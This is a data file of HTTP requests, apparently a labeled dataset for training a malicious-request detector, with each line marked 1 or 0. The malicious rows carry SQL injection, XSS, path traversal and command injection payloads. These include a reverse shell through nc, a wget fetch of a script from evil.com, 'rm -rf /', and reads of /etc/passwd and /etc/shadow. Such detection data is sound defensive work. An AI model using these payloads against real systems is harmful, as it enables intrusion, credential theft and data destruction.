GET /api/orders?tags=thank%20%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E%20is&filters=please+find+attached&columns=system+log+entry&phone=thank+you User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /about old_password=688&lang=please+find+attached&first_name=176&title=I+would+like+to+order&q=499 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PATCH /register tracking=207&price_max=system%20%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%20is User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /posts/789 product_id=%7C%20cat%20/etc/passwd&status=610&quantity=486 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /login order_id=587&tracking=I%20%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E%20user User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /images/logo.png?columns=..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam&new_password=contact+me+at+email@example.com&lang=109 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /profile page=test+user&comment=my%20..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam%20comment&rating=600&name=this+is+a+normal+comment&id=my+address+is User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /products/123?new_password=thank%20%27%20AND%201%3D2--%20you&color=my+address+is&order=325&phone=my+address+is User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /dashboard?order_id=thank+you&id=I%20%3B%20wget%20http%3A//evil.com/shell.sh%20you User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /js/app.js price_min=793&author=best+regards&order_id=694&rating=423 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
HEAD /users/456?lang=hello+world&region=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /api/reports?price_min=hello+world&tag=167&date=hello+world&format=123+Main+St User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
GET /products/123?page=48 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
GET /api/search?search_term=%27%3B%20DROP%20TABLE%20users--&tracking=John+Doe User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /users/456?category=289&filter=I%20%27%3B%20WAITFOR%20DELAY%20%2700%3A00%3A05%27--%20you User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /dashboard email=773 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
OPTIONS /profile?price_min=hello+world User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
HEAD /api/v1/data?filters=best+regards&last_name=contact%20%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E%20Doe&id=905 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
POST /css/style.css password=please+find+attached&type=hello%20%3B/bin/c%3F%3F%20/etc/p%3F%3F%3F%3Fd%20request User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /images/logo.png?name=38&city=496&filter=%26%20%24%28which%20bash%29%20-c%20%27ls%27&new_password=admin+access+request User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /settings region=%3Csvg%20onload%3Dalert%281%29%3E User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /dashboard?q=this%20%27%20OR%20%271%27%3D%271%27--%20user&search_term=272&first_name=test+user User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /api/search region=660&order=system+log+entry User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PATCH /docs/api type=contact+me+at+email@example.com&category=contact%20%3B/bin/c%3F%3F%20/etc/p%3F%3F%3F%3Fd%20attached&last_name=I+would+like+to+order User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /register?sort=thank+you User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PUT /about price_max=123+Main+St&category=best+regards&first_name=system+log+entry&columns=240&last_name=this+is+a+normal+comment User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
GET /help/faq?page=%3B%20%24%28printf%20%27%5Cx6c%5Cx73%27%29&price_max=805&name=thank+you&quantity=thank+you User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /api/search?search_term=admin+access+request&tracking=this+is+a+normal+comment&title=test+user&age=597 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
HEAD /contact?title=contact%20%26%20%24%28which%20bash%29%20-c%20%27ls%27%20is&old_password=this+is+a+normal+comment&region=798 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /api/reports?content=test%20admin%27%20OR%20%271%27%3D%271%20entry&token=324 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /posts/789 search_term=please+find+attached User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PATCH /contact region=449&date=503&action=%3Bcat%24%7BIFS%7D/etc/passwd User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /api/users type=%27%20AND%201%3D1-- User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /images/logo.png name=thank+you&filters=test+user&order=1%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27--&status=system+log+entry&username=224 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /register?city=%3B%20rm%20-rf%20/ User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /images/logo.png?columns=%3B%20rm%20-rf%20/&first_name=123+Main+St&filter=554&user_id=802 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /users/456 id=95&filters=test+user User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
GET /api/v1/data?sort=I%201%27%20UNION%20ALL%20SELECT%20username%2Cpassword%2Cemail%20FROM%20users--%20user&session=603 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /api/v2/analytics status=thank+you&content=admin%201%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--%20regards&quantity=951&password=system+log+entry&token=test+user User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /contact?author=this+is+a+normal+comment&email=157 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PUT /login order=John%20..%25252f..%25252f..%25252fetc%25252fpasswd%20comment User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /css/style.css?filters=I+would+like+to+order&new_password=John+Doe&phone=846&order_id=test%20%26%20nc%20-e%20/bin/bash%20evil.com%204444%20email%40example.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /js/app.js?tracking=%27%3B%20DELETE%20FROM%20products%20WHERE%201%3D1--&quantity=admin+access+request&view=744&action=this+is+a+normal+comment&city=865 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /contact session=admin+access+request&view=test+user&quantity=hello%20%27%20OR%20%271%27%3D%271%27--%20comment User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /js/app.js status=system%201%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--%20comment&tags=admin+access+request User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /api/v1/data?price_max=42&title=file%3A///etc/passwd&comment=796 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /api/v2/analytics color=please+find+attached&region=123+Main+St&username=thank+you&last_name=%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /images/logo.png?date=contact+me+at+email@example.com&search_term=746&password=725&filters=893 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /api/reports?lang=my+address+is&tags=best+regards&limit=my+address+is&content=123+Main+St&sort=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /js/app.js date=%27%20AND%20%27x%27%3D%27x&rating=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /products/123?price_max=123%20%3Csvg/onload%3Dalert%281%29%3E%20user&title=1&old_password=359&tags=123+Main+St&user_id=test+user User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /contact category=554&limit=hello+world User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET /about?comment=please%20%7Cc%27a%27t%20/etc/passwd%20St User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /dashboard?comment=thank+you&date=%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E&color=637&region=system+log+entry&price_max=thank+you User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /api/products?city=contact+me+at+email@example.com&q=I%20%3Bcat%24%7BIFS%7D/etc/passwd%20entry&tags=595 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /images/logo.png?age=best+regards&name=241&format=this+is+a+normal+comment&old_password=please+find+attached User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
GET /products/123?title=%26%20whoami&city=I+would+like+to+order&q=my+address+is&search=391 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /images/logo.png?order=%26%20%24%28which%20bash%29%20-c%20%27ls%27 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /api/users?password=%3Csvg%20onload%3Dalert%281%29%3E&price_min=95 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /api/reports?columns=....//....//....//etc/passwd User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /users/456?tracking=503&limit=system%20%27%20OR%20%271%27%3D%271%27--%20regards User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /products/123?price_max=best%20%60id%60%20you User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /help/faq q=best+regards&status=John+Doe User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
POST /api/v1/data quantity=hello+world&session=%24%28cat%20/etc/shadow%29&user_id=John+Doe User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /api/products?rating=hello+world&order_id=123+Main+St&type=459&tags=admin%27-- User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /js/app.js old_password=my+address+is&type=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E&order=440&lang=best+regards User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /images/logo.png?id=best%20admin%27/%2A%20comment&title=605 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /settings?product_id=admin%20%7Cawk%20%27%7Bprint%20%241%7D%27%20/etc/passwd%20St User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /css/style.css type=%27%20AND%20SLEEP%285%29-- User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /images/logo.png view=thank+you&city=665 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
POST /api/v2/analytics city=%3Csvg%20onload%3Dalert%281%29%3E User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /login?first_name=John+Doe&tags=system+log+entry&page=I%20%27%20AND%20SLEEP%285%29--%20comment User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /api/products price_max=111&type=667&format=361&order=%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29-- User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /images/logo.png?q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E&action=753&search=please+find+attached&limit=897&date=John+Doe User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /api/v2/analytics?session=this+is+a+normal+comment&action=best%201%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27--%20you User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /help/faq?filter=60&category=please+find+attached&token=I%20%27%20AND%20%27x%27%3D%27x%20entry User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /images/logo.png color=%3Cbody%20onload%3Dalert%28document.domain%29%3E User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /contact format=267&content=8&q=I%20%27%20AND%20%27x%27%3D%27x%20request User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /profile action=637 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PUT /api/products search_term=886&category=511 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
OPTIONS /docs/api?name=418&filters=best+regards User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
GET /js/app.js?comment=my%20%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%20comment User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
OPTIONS /settings?content=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E&order_id=123+Main+St User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /posts/789?region=780&token=143&name=906&status=John%20..%25252f..%25252f..%25252fetc%25252fpasswd%20email%40example.com&page=86 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /login price_max=admin%20../../../etc/passwd%20you User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /help/faq?tags=373&product_id=93&order_id=244 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
GET /posts/789?last_name=please%20%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%20order User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
HEAD /register?title=best%20admin%27%23%20regards&email=10&color=163 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /dashboard rating=test+user&color=please%20%27%20OR%201%3D1--%20world&content=hello+world User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /api/v2/analytics?token=best%20%27%20AND%20%27x%27%3D%27x%20entry User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /register?old_password=admin%20%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%20Doe&limit=542&age=my+address+is&new_password=system+log+entry User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /dashboard?limit=this+is+a+normal+comment&price_min=admin+access+request&tag=%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /register new_password=....%5C%5C....%5C%5C....%5C%5Cwindows%5C%5Csystem32&view=940&color=system+log+entry&type=please+find+attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /api/orders?phone=607 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
OPTIONS /docs/api?type=%27%20AND%20%27x%27%3D%27y&email=system+log+entry User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /about?tracking=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&price_min=admin+access+request&price_max=690 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /login category=%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E&date=this+is+a+normal+comment&order=747&old_password=contact+me+at+email@example.com&page=309 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /images/logo.png?username=503 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PATCH /register old_password=171 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
GET /css/style.css?price_min=John%20%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E%20email%40example.com User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /posts/789?page=this+is+a+normal+comment User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
POST /products/123 author=123+Main+St&format=hello+world&old_password=379&last_name=957&phone=test+user User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
DELETE /profile?status=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd&username=hello+world&search=241&order=537&filter=best+regards User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /posts/789?format=please+find+attached&search=891&search_term=936&content=323&first_name=system+log+entry User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
POST /api/v1/data price_min=394&last_name=thank+you&sort=my+address+is User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
DELETE /docs/api?first_name=my+address+is&old_password=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /products/123?order_id=390&session=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /login user_id=%27%3B%20SELECT%20pg_sleep%285%29--&columns=thank+you User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /dashboard age=hello+world&new_password=28&token=268&view=366 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
POST /api/products format=566&last_name=847 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PUT /api/v2/analytics city=650&name=hello+world&id=292 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
GET /docs/api?username=205&old_password=426&quantity=please+find+attached&email=system+log+entry&new_password=my+address+is User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PUT /api/products first_name=best+regards&token=318&columns=admin%20%27%3B%20DELETE%20FROM%20products%20WHERE%201%3D1--%20world&date=my+address+is&name=801 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /profile?id=please+find+attached&tag=John+Doe&tags=18 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET /api/search?search=my%20file%3A///etc/passwd%20order&tags=39&author=thank+you User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /images/logo.png?format=324&order=hello+world&password=thank+you&color=admin+access+request&q=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
DELETE /api/v1/data?id=346&format=thank+you&status=40&quantity=this+is+a+normal+comment&rating=727 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET /api/products?q=123+Main+St&comment=303 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
OPTIONS /login?category=best+regards&new_password=%27%20AND%201%3D1--&name=974&first_name=I+would+like+to+order&rating=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /login filter=123%20%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E%20attached User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /help/faq category=897&filters=best%20%27%20AND%20%27x%27%3D%27y%20comment User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /about?username=contact+me+at+email@example.com&columns=107&password=please%20%27%20OR%20%271%27%3D%271%27--%20comment&session=349 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /api/search order_id=%3Csvg/onload%3Dalert%281%29%3E&tracking=343 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /dashboard?search_term=118&limit=461&order_id=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /api/reports?age=821&limit=test%20%24%28cat%20/etc/shadow%29%20request User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /api/v1/data tracking=49&limit=32&title=657 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
PUT /products/123 color=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E&limit=574&user_id=892&price_min=please+find+attached&author=736 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /js/app.js?author=123%20%24%28cat%20/etc/shadow%29%20St&order=791&password=123+Main+St User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /api/reports?title=admin+access+request&order_id=test%201%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--%20request&type=690 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /js/app.js?view=I+would+like+to+order&q=66&search=my+address+is User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PUT /api/reports email=123+Main+St User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PATCH /api/v1/data comment=529&q=best%20%27%3B%20SELECT%20pg_sleep%285%29--%20email%40example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /images/logo.png?phone=1%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables-- User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /api/orders last_name=I+would+like+to+order&user_id=909&tracking=I+would+like+to+order&color=918&product_id=%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /api/users?tags=614&category=hello+world&quantity=system+log+entry&action=456 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
POST /images/logo.png token=484 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
OPTIONS /contact?age=%3Cbody%20onload%3Dalert%28document.domain%29%3E User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /api/orders new_password=969&comment=I+would+like+to+order&search_term=best+regards&filter=system+log+entry User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
OPTIONS /js/app.js?filters=%3B%20wget%20http%3A//evil.com/shell.sh&username=thank+you&order_id=my+address+is&tag=admin+access+request&last_name=563 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /posts/789?date=system+log+entry&search_term=contact%20%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%20regards&title=841&last_name=538 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /js/app.js?token=124&action=thank%20%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E%20entry User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /dashboard id=John+Doe&first_name=....//....//....//etc/passwd User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /contact?price_min=hello+world&sort=best%20%27%3B%20DELETE%20FROM%20products%20WHERE%201%3D1--%20user User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /docs/api password=789&view=system+log+entry&price_max=11&tracking=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PATCH /api/v1/data first_name=I+would+like+to+order&page=best+regards&new_password=133&price_min=my+address+is&phone=admin%27%20OR%20%271%27%3D%271 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /api/orders?columns=%27%3B%20WAITFOR%20DELAY%20%2700%3A00%3A05%27-- User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /api/orders?price_min=1%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27--&session=862 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /api/search?search_term=%3Csvg/onload%3Dalert%281%29%3E&user_id=858 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /api/users search=test%20%27%20AND%201%3D2--%20you&order_id=test+user&quantity=test+user&filter=this+is+a+normal+comment User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /users/456?age=test+user&action=contact+me+at+email@example.com&rating=my+address+is&last_name=hello+world&region=262 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PATCH /api/users old_password=I+would+like+to+order&id=790&search_term=contact+me+at+email@example.com&price_max=969&session=admin%20%27%20AND%20%27x%27%3D%27x%20comment User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /api/users?email=284&q=/var/www/../../etc/passwd User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /api/v1/data user_id=admin+access+request&password=123%20%27%20AND%201%3D2--%20Doe User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /about?search_term=I+would+like+to+order&session=%27%20AND%20extractvalue%281%2Cconcat%280x7e%2Cversion%28%29%29%29--&category=I+would+like+to+order User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /products/123 new_password=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL-- User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
OPTIONS /docs/api?view=admin%27/%2A&email=thank+you&password=361 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /settings?email=hello%20..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam%20is&tag=484 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /register?title=206&tracking=hello%20admin%27/%2A%20St User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /api/orders format=test+user&type=this%20%27%20AND%20SLEEP%285%29--%20request&status=123+Main+St User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
